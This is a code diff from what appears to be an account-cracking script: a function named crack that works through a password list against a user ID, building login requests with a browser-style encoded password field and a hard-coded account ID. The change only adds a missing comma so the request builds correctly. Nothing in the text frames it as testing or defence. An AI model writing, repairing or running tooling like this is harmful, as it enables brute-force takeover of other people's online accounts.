@@ -264,7 +264,7 @@ def crack(uid, password_list, total_count):
                 "block_store_machine_id": "",
                 "zero_balance_state": "",
                 "contact_point": uid,
-                "password": "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw)
+                "password": "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),
                 "accounts_list": [{
                     "uid": "100061465976024",
                     "credential_type": "nonce",
